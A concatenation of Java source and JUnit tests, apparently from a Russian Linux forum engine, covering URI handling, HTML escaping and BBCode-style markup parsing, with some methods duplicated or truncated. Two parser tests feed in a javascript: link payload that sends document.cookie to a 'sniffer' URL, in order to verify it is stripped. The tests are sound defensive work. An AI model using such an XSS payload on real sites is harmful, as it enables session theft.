public void testEscape ( ) { assertEquals ( " &lt;script&gt; " , StringUtil . escapeHtml ( " <script> " ) ) ; } 
public void testEscapeEntity ( ) { assertEquals ( " &nbsp; " , StringUtil . escapeHtml ( " &nbsp; " ) ) ; } 
public void testEscapeEntity2 ( ) { assertEquals ( " &#41;&#41;&#41; " , StringUtil . escapeHtml ( " &#41;&#41;&#41; " ) ) ; } 
public void test7 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainUrl , url7 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test8 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainUrl , url8 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test9 ( ) throws Exception { LorURI lorURI = new LorURI ( mainUrl , url9 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " " , lorURI . fixScheme ( false ) ) ; assertEquals ( " " , lorURI . fixScheme ( true ) ) ; } 
public void test10 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainUrl , url10 ) ; } catch ( Exception e ) { result = true ; } assertTrue ( result ) ; } 
public void init ( ) { try { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , true , " UTF-8 " ) ; } catch ( Exception e ) { throw new RuntimeException ( errMsg + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { throw new RuntimeException ( errMsg + " URI not absolute path " ) ; } try { mainHost = mainURI . getHost ( ) ; 
public boolean compareWithMainURI ( URI uri ) { try { return ( mainHost . equals ( uri . getHost ( ) ) & & mainPort = = uri . getPort ( ) ) ; 
public String toString ( ) { return lorURI . toString ( ) ; } 
public String fixScheme ( boolean secure ) throws URIException { if ( ! isTrueLorUrl ) { return " " ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; URI fixUri = new URI ( scheme , null , host , port , path , query , fragment ) ; return fixUri . getEscapedURI ( ) ; } 
public String formatJump ( MessageDao messageDao , boolean secure ) throws MessageNotFoundException , BadGroupException , URIException { if ( isMessageUrl ) { Message message = messageDao . getById ( messageId ) ; Group group = messageDao . getGroup ( message ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainURI . getHost ( ) ; int port = mainURI . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( isCommentUrl ( ) ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
private RootNode prepareRootNode ( boolean renderCut , boolean cleanCut , String cutUrl , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; return rootNode ; } 
public String format ( String text , boolean secure ) { String escapedText = StringUtil . escapeHtml ( text ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String token = st . nextToken ( ) ; String formattedToken ; try { formattedToken = formatURL ( token , secure ) ; } catch ( Exception e ) { formattedToken = token ; } sb . append ( formattedToken ) ; } return sb . toString ( ) ; } 
public String format ( String text , boolean quoting ) { String newText = text . replaceAll ( " \\ [(/?code) \\ ] " , " [[$1]] " ) ; if ( quoting ) { return quote ( newText ) ; 
public void initTest ( ) throws Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , true , " UTF-8 " ) ; messageDao = mock ( MessageDao . class ) ; message1 = mock ( Message . class ) ; group1 = mock ( Group . class ) ; message2 = mock ( Message . class ) ; group2 = mock ( Group . class ) ; message3 = mock ( Message . class ) ; group3 = mock ( Group . class ) ; message12 = mock ( Message . class ) ; group12 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . thenReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . thenReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . thenReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . thenReturn ( " /forum/security/ " ) ; when ( messageDao . getGroup ( message1 ) ) . thenReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . thenReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . thenReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . thenReturn ( group12 ) ; when ( messageDao . getById ( 6753486 ) ) . thenReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . thenReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . thenReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . thenReturn ( message12 ) ; } 
public void test1 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url1 ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test2 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/talks/6893165 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test3 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test4 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url4 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test5 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url5 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test6 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url6 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( true ) ) ; } 
public void test7 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainURI , url7 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test8 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainURI , url8 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test9 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url9 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " " , lorURI . fixScheme ( false ) ) ; assertEquals ( " " , lorURI . fixScheme ( true ) ) ; } 
public void test10 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainURI , url10 ) ; } catch ( Exception e ) { result = true ; } assertTrue ( result ) ; } 
public void test11 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url11 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( ! lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; } 
public void test12 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " http:127.0.0.1:8080/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " https:127.0.0.1:8080/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , true ) ) ; } 
public String toString ( ) { return lorURI . getEscapedURIReference ( ) ; } 
public void init ( ) throws Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , true , " UTF-8 " ) ; configuration = mock ( Configuration . class ) ; when ( configuration . getMainURI ( ) ) . thenReturn ( mainURI ) ; toHtmlFormatter = new ToHtmlFormatter ( ) ; toHtmlFormatter . setConfiguration ( configuration ) ; toHtmlFormatter20 = new ToHtmlFormatter ( ) ; toHtmlFormatter20 . setConfiguration ( configuration ) ; toHtmlFormatter20 . setMaxLength ( 20 ) ; toLorCodeTexFormatter = new ToLorCodeTexFormatter ( ) ; toLorCodeFormatter = new ToLorCodeFormatter ( ) ; } 
public void testToLorCodeTexFormatter ( ) { assertEquals ( RESULT_QUOTING1 , toLorCodeTexFormatter . format ( QUOTING1 , true ) ) ; assertEquals ( RESULT_QUOTING1_NOQUOTING , toLorCodeTexFormatter . format ( QUOTING1 , false ) ) ; assertEquals ( RESULT_QUOTING2 , toLorCodeTexFormatter . format ( QUOTING2 , true ) ) ; assertEquals ( RESULT_QUOTING3 , toLorCodeTexFormatter . format ( QUOTING3 , true ) ) ; assertEquals ( " n[i]>test n[/i] ntest " , toLorCodeTexFormatter . format ( " >test ntest " , true ) ) ; 4 assertEquals("testtesttest", toLorCodeTexFormatter.format("testtesttest", true)); 1 assertEquals("test[i]>test[/i]", toLorCodeTexFormatter.format("test>test", true)); 7 assertEquals("test &", toLorCodeTexFormatter.format("test &", true)); 8 assertEquals("test[br]test", toLorCodeFormatter.format("test\rtest", true)); 9 assertEquals("test[br]test", toLorCodeFormatter.format("testtest", true)); 10 assertEquals("[i]>test[/i][br]test", toLorCodeFormatter.format(">testtest", true)); 11 assertEquals("[i]>test[/i][i][br]>test[/i]", toLorCodeFormatter.format(">test>test", true)); 12 } 
public void testCrash ( ) { try { assertEquals ( " &quot;<a href= \" http:www.google.com/&quot; \" >http:www.google.com/&quot;</a> " , 
public void testHTMLEscape ( ) { String str = " This is an entity &#1999; " ; String s = StringUtil . escapeHtml ( str ) ; assertThat ( " String should remaint unescaped " , s , CoreMatchers . equalTo ( str ) ) ; str = " a&b " ; s = StringUtil . escapeHtml ( str ) ; assertThat ( " Ampersand should be escaped " , s , CoreMatchers . equalTo ( " a&amp;b " ) ) ; assertEquals ( " &lt;script&gt; " , StringUtil . escapeHtml ( " <script> " ) ) ; assertEquals ( " &nbsp; " , StringUtil . escapeHtml ( " &nbsp; " ) ) ; assertEquals ( " &#41;&#41;&#41; " , StringUtil . escapeHtml ( " &#41;&#41;&#41; " ) ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parser ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public void testToHtmlFormatter ( ) { assertEquals ( RESULT1 , toHtmlFormatter . format ( TEXT1 , false ) ) ; assertEquals ( RESULT2 , toHtmlFormatter . format ( TEXT2 , false ) ) ; assertEquals ( RESULT3 , toHtmlFormatter20 . format ( TEXT3 , false ) ) ; assertEquals ( RESULT8 , toHtmlFormatter20 . format ( TEXT8 , false ) ) ; assertEquals ( RESULT9 , toHtmlFormatter . format ( TEXT9 , false ) ) ; assertEquals ( RESULT10 , toHtmlFormatter . format ( TEXT10 , false ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_UNDERSCORE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( LINK_WITH_PARAM_ONLY , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( RFC1738 , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( CYR_LINK , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( GOOGLE_CACHE , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( URL_WITH_AT , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( Latin1Supplement , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( greek , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( QP , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( EMPTY_ANCHOR , false ) . endsWith ( " </a> " ) ) ; assertTrue ( toHtmlFormatter . format ( SLASH_AFTER_AMP , false ) . endsWith ( " </a> " ) ) ; } 
public void test7 ( ) throws Exception { LorURI lorURI = new LorURI ( mainURI , url7 ) ; assertEquals ( 0 , lorURI . getMessageId ( ) ) ; assertEquals ( 0 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( ! lorURI . isMessageUrl ( ) ) ; assertTrue ( ! lorURI . isCommentUrl ( ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , false ) ) ; assertEquals ( " " , lorURI . formatJump ( messageDao , true ) ) ; assertEquals ( " http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( false ) ) ; assertEquals ( " https:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on " , lorURI . fixScheme ( true ) ) ; } 
public void test8 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainURI , failurl8 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test9 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainURI , failurl9 ) ; } catch ( URIException e ) { result = true ; } assertTrue ( result ) ; } 
public void test10 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainURI , failurl10 ) ; } catch ( Exception e ) { result = true ; } assertTrue ( result ) ; } 
public void test11 ( ) throws Exception { boolean result = false ; try { LorURI lorURI = new LorURI ( mainURI , failurl11 ) ; } catch ( Exception e ) { result = true ; } assertTrue ( result ) ; } 
public PreparedPoll preparePoll ( Poll poll ) { return new PreparedPoll ( poll , pollDao . getMaxVote ( poll ) , pollDao . getCountUsers ( poll ) , pollDao . getPollVariants ( poll , Poll . ORDER_VOTES ) ) ; } 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , false , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Message message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . build ( message , request . isSecure ( ) ) ; ModelAndView mv = new ModelAndView ( " history " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public ModelAndView showForm ( @RequestParam ( " group " ) int id , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } Group group = groupDao . getGroup ( id ) ; ModelAndView mv = new ModelAndView ( " groupmod " , " group " , group ) ; mv . getModel ( ) . put ( " groupInfo " , prepareService . prepareGroupInfo ( group , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView gallery ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_GALLERY , null , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView forum ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_FORUM , null , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , " /forum/lenta " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView polls ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_POLLS , null , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , " /polls/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView news ( @RequestParam ( required = false ) Integer offset , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( null , null , Section . SECTION_NEWS , null , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , " /news/ " ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView galleryGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) throws Exception { return group ( Section . SECTION_GALLERY , offset , groupName , request , response ) ; } 
public ModelAndView newsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) throws Exception { return group ( Section . SECTION_NEWS , offset , groupName , request , response ) ; } 
public ModelAndView pollsGroup ( @RequestParam ( required = false ) Integer offset , @PathVariable ( " group " ) String groupName , HttpServletRequest request , HttpServletResponse response ) throws Exception { return group ( Section . SECTION_POLLS , offset , groupName , request , response ) ; } 
public ModelAndView group ( int sectionId , Integer offset , String groupName , HttpServletRequest request , HttpServletResponse response ) throws Exception { Section section = sectionDao . getSection ( sectionId ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView mv = showNews ( null , null , group . getSectionId ( ) , group . getId ( ) , null , offset , request , response ) ; mv . getModel ( ) . put ( " url " , group . getUrl ( ) ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public ModelAndView galleryArchive ( @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletRequest request , HttpServletResponse response ) throws Exception { ModelAndView mv = showNews ( month , year , Section . getSection ( section ) , null , null , null , request , response ) ; mv . getModel ( ) . put ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; mv . getModel ( ) . put ( " params " , null ) ; return mv ; } 
public PreparedMessage prepareMessage ( Message message , boolean minimizeCut , boolean secure ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > tags , PreparedPoll newPoll , boolean secure ) { return prepareMessage ( message , tags , false , newPoll , secure ) ; } 
private PreparedMessage prepareMessage ( Message message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public PreparedComment prepareComment ( Comment comment , String message , boolean secure ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = lorCodeService . parseComment ( message , secure ) ; return new PreparedComment ( comment , author , processedMessage , null ) ; } 
public List < PreparedMessage > prepareMessages ( List < Message > messages , boolean secure ) { List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public ModelAndView uncommitForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUncommitable ( message ) ; ModelAndView mv = new ModelAndView ( " uncommit " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , false , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! tmpl . isSessionAuthorized ( ) ) { throw new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = tmpl . isSessionAuthorized ( ) & & tmpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | tmpl . isModeratorSession ( ) ) ; if ( tmpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , ignoreListDao . get ( tmpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public String mapRow ( ResultSet resultSet , int i ) throws SQLException { String text = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return lorCodeService . parseComment ( text , secure ) ; 
public List < RepliesListItem > getRepliesForUser ( User user , boolean showPrivate , int topics , int offset , final boolean readMessage , final boolean secure ) { String queryString ; if ( showPrivate ) { queryString = queryAllRepliesForUser ; } else { queryString = queryRepliesForUserWihoutPrivate ; } return jdbcTemplate . query ( queryString , new RowMapper < RepliesListItem > ( ) { @Override 
public String parseComment ( String text , boolean secure ) { return defaultParser . parseRoot ( prepareCommentRootNode ( secure ) , text ) . renderXHtml ( ) ; } 
public ParserResult parseCommentWithReplies ( String text , boolean secure ) { RootNode rootNode = defaultParser . parseRoot ( prepareCommentRootNode ( secure ) , text ) ; Set < User > replier = rootNode . getReplier ( ) ; String html = rootNode . renderXHtml ( ) ; return new ParserResult ( html , replier ) ; } 
public String parseTopicWithMinimizedCut ( String text , String cutURL , boolean secure ) { return defaultParser . parseRoot ( prepareTopicRootNode ( true , cutURL , secure ) , text ) . renderXHtml ( ) ; } 
public String parseTopic ( String text , boolean secure ) { return defaultParser . parseRoot ( prepareTopicRootNode ( false , null , secure ) , text ) . renderXHtml ( ) ; } 
private RootNode prepareCommentRootNode ( boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; rootNode . setCommentCutOptions ( ) ; rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; return rootNode ; } 
private RootNode prepareTopicRootNode ( boolean minimizeCut , String cutURL , boolean secure ) { RootNode rootNode = defaultParser . getRootNode ( ) ; if ( minimizeCut ) { try { LorURI cutURI = new LorURI ( configuration . getMainURI ( ) , cutURL ) ; if ( cutURI . isTrueLorUrl ( ) ) { URI fixURI = new URI ( cutURI . fixScheme ( secure ) , true , " UTF-8 " ) ; rootNode . setMinimizedTopicCutOptions ( fixURI ) ; } else { rootNode . setMaximizedTopicCutOptions ( ) ; } } catch ( Exception e ) { rootNode . setMaximizedTopicCutOptions ( ) ; } } else { rootNode . setMaximizedTopicCutOptions ( ) ; } rootNode . setUserDao ( userDao ) ; rootNode . setSecure ( secure ) ; rootNode . setToHtmlFormatter ( toHtmlFormatter ) ; return rootNode ; } 
public boolean isComment ( ) { return cutType = = ParserParameters . CutType . INCOMMENT ; } 
public boolean isTopicMinimized ( ) { return cutType = = ParserParameters . CutType . INTOPIC_MINIMIZED ; } 
public boolean isTopicMaximized ( ) { return cutType = = ParserParameters . CutType . INTOPIC_MAXIMIZED ; } 
public void init ( ) { lorCodeService = new LorCodeService ( ) ; } 
public void pTest ( ) { Assert . assertEquals ( " <p>test ntest1</p><p>test2</p> " , lorCodeService . parseComment ( " test ntest1 ntest2 " , false ) ) ; 
public void tagEscapeTest ( ) { Assert . assertEquals ( " <p>&lt;br&gt;</p> " , lorCodeService . parseComment ( " <br> " , false ) ) ; 
public void urlEscapeTest ( ) { Assert . assertEquals ( " <p><s>Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false ) ) ; 
public void urlEscapeWithTagsTest ( ) { Assert . assertEquals ( " <p><s>T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false ) ) ; 
public void badListTest ( ) { Assert . assertEquals ( " <p>0</p><ul><li>1</li><li>2</li></ul> " , lorCodeService . parseComment ( " [list]0[*]1[*]2[/list] " , false ) ) ; 
